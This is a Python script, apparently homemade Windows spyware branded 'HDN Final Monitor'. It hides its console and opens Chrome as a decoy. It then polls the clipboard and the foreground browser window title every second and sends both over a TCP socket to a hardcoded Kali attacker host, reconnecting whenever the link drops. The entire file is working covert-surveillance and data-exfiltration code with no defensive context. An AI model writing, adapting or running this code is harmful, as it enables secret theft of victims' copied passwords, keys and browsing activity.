#!/usr/bin/env python3
import socket
import time
import subprocess
import threading
import ctypes
import os
import sys
import webbrowser
from datetime import datetime
from ctypes import wintypes
import win32clipboard

# ============ CONFIGURATION ============
KALI_IP = "192.168.74.128"
KALI_PORT = 7777
HIDE_WINDOW = True
OPEN_CHROME = True
CHROME_URL = "https://www.google.com"
# =======================================

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class HDNFinal:
    def __init__(self):
        self.last_browser = ""
        self.last_clipboard = ""
        self.socket = None
        self.running = True
        
    def open_chrome(self):
        if OPEN_CHROME:
            try:
                chrome_paths = [
                    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                ]
                for path in chrome_paths:
                    if os.path.exists(path):
                        subprocess.Popen([path, CHROME_URL, "--new-window"],
                                       creationflags=subprocess.CREATE_NO_WINDOW)
                        print("[✓] Chrome opened!")
                        return
                webbrowser.open(CHROME_URL)
            except:
                webbrowser.open(CHROME_URL)
    
    def get_foreground_window(self):
        try:
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value
        except:
            pass
        return None
    
    def get_browser_title(self):
        title = self.get_foreground_window()
        if title and any(b in title.lower() for b in ['chrome', 'firefox', 'edge', 'mozilla']):
            return title
        return None
    
    def get_clipboard(self):
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data and len(data) < 500:
                return ' '.join(data.split())[:200]
        except:
            pass
        return None
    
    def send_data(self, s, data_type, content):
        try:
            s.send(f"[{data_type}] {content}\n".encode())
            return True
        except:
            return False
    
    def keep_alive(self, s):
        while self.running:
            try:
                s.send(b"ping\n")
                time.sleep(10)
            except:
                break
    
    def run(self):
        # Open Chrome
        self.open_chrome()
        
        print("""
╔══════════════════════════════════════════════════════════════╗
║         HDN FINAL MONITOR - HASNAINDARKNET                   ║
║         Browser + Clipboard                                  ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((KALI_IP, KALI_PORT))
                print(f"[✓] Connected to Kali: {KALI_IP}:{KALI_PORT}")
                
                threading.Thread(target=self.keep_alive, args=(s,), daemon=True).start()
                s.send(b"[+] HDN Monitor Started\n")
                
                while True:
                    try:
                        browser = self.get_browser_title()
                        if browser and browser != self.last_browser:
                            self.last_browser = browser
                            print(f"[🌐] {browser[:50]}")
                            self.send_data(s, "BROWSER", browser)
                        
                        clipboard = self.get_clipboard()
                        if clipboard and clipboard != self.last_clipboard:
                            self.last_clipboard = clipboard
                            print(f"[📋] {clipboard[:40]}")
                            self.send_data(s, "CLIPBOARD", clipboard)
                        
                        time.sleep(1)
                        
                    except socket.error:
                        print("[!] Lost connection, reconnecting...")
                        break
                    except Exception as e:
                        print(f"Error: {e}")
                        time.sleep(1)
                        
            except Exception as e:
                print(f"[!] Waiting for Kali...")
                time.sleep(5)

if __name__ == "__main__":
    # Hide console
    if HIDE_WINDOW and len(sys.argv) < 2:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    monitor = HDNFinal()
    monitor.run()